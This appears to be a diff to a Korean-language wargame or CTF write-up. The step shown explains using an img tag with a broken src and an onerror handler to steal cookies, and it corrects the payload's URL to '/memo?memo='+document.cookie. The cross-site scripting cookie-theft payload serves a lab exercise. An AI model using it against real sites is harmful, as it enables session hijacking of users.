@@ -20,7 +20,7 @@ step 1
 step 2
 * 단순 script 태그가 아니라 img 태그를 이용하자. 존재하지 않는 경로를 주고 이미지 로딩에 실패했을 때의 onerror 이벤트를 넣어주면 쿠키를 탈취할 수 있다.
     ```
-    <img src="wrong" onerror="location.href='/memo memo='+document.cookie">
+    <img src="wrong" onerror="location.href='/memo?memo='+document.cookie">
     ```
 
 
